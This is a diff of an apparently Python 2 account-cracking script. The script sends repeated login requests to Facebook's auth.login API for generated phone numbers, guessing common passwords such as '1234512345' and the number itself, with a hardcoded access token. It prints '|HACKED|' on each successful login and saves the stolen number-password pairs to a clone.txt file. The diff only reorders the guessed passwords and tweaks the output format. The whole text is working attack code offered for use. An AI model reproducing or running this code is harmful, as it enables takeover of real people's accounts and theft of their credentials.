@@ -310,7 +310,7 @@ def action():
 
         try:
 
-            pass1 = '1234512345'
+            pass1 = '1234554321'
 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 
@@ -318,7 +318,7 @@ def action():
 
             if 'access_token' in q:
 
-                print '\x1b[1;92m|HACKED|\x1b[1;92mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass1
+                print '\x1b[1;92m|HACKED|\x1b[1;92m NUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass1
 
                 okb = open('anggaxd/clone.txt', 'a')
 
@@ -330,7 +330,7 @@ def action():
 
             else:
 
-                pass2 = user
+                pass2 = '1122334455'
 
                 data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 
@@ -338,7 +338,7 @@ def action():
 
                 if 'access_token' in q:
 
-                    print '\x1b[1;92m|HACKED|\x1b[1;92mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass2
+                    print '\x1b[1;92m|HACKED|\x1b[1;92m NUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass2
 
                     okb = open('anggaxd/clone.txt', 'a')
 
@@ -350,7 +350,7 @@ def action():
 
                 else:
 
-                    pass3 = '1122334455'
+                    pass3 = '112233445566'
 
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 
@@ -358,7 +358,7 @@ def action():
 
                     if 'access_token' in q:
 
-                        print '\x1b[1;92m|HACKED|\x1b[1;92mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass3
+                        print '\x1b[1;92m|HACKED|\x1b[1;92m NUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass3
 
                         okb = open('anggaxd/clone.txt', 'a')
 
@@ -370,7 +370,7 @@ def action():
 
                     else:
 
-                        pass4 = '1234554321'
+                        pass4 = '123456654321'
 
                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 
@@ -378,7 +378,7 @@ def action():
 
                         if 'access_token' in q:
 
-                            print '\x1b[1;92m|HACKED|\x1b[1;92mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass4
+                            print '\x1b[1;92m|HACKED|\x1b[1;92m NUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass4
 
                             okb = open('anggaxd/clone.txt', 'a')
 
@@ -390,7 +390,7 @@ def action():
 
                         else:
 
-                            pass5 = '1122334455'
+                            pass5 = '1234512345'
 
                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 
@@ -398,7 +398,7 @@ def action():
 
                             if 'access_token' in q:
 
-                                print '\x1b[1;92m|HACKED|\x1b[1;97mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass5
+                                print '\x1b[1;92m|HACKED|\x1b[1;97m NUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass5
 
                                 okb = open('anggaxd/clone.txt', 'a')
 
@@ -410,7 +410,7 @@ def action():
 
                             else:
 
-                                pass6 = '123456123456'
+                                pass6 = '123456654321'
 
                                 data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 
@@ -418,7 +418,7 @@ def action():
 
                                 if 'access_token' in q:
 
-                                    print '\x1b[1;92m|HACKED|\x1b[1;92mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass6
+                                    print '\x1b[1;92m|HACKED|\x1b[1;92m NUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass6
 
                                     okb = open('anggaxd/clone.txt', 'a')
 
@@ -430,7 +430,7 @@ def action():
 
                                 else:
 
-                                    pass7 = '123456654321'
+                                    pass7 = '123454321'
 
                                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 
@@ -438,7 +438,7 @@ def action():
 
                                     if 'access_token' in q:
 
-                                        print '\x1b[1;92m|HACKED|\x1b[1;92mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass7
+                                        print '\x1b[1;92m|HACKED|\x1b[1;92m NUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass7
 
                                         okb = open('anggaxd/clone.txt', 'a')
 
@@ -450,7 +450,7 @@ def action():
 
                                     else:
 
-                                        pass8 = '112233445566'
+                                        pass8 = user
 
                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 
@@ -458,7 +458,7 @@ def action():
 
                                         if 'access_token' in q:
 
-                                            print '\x1b[1;92m|HACKED|\x1b[1;92mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass8
+                                            print '\x1b[1;92m|HACKED|\x1b[1;92m NUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass8
 
                                             okb = open('anggaxd/clone.txt', 'a')
 
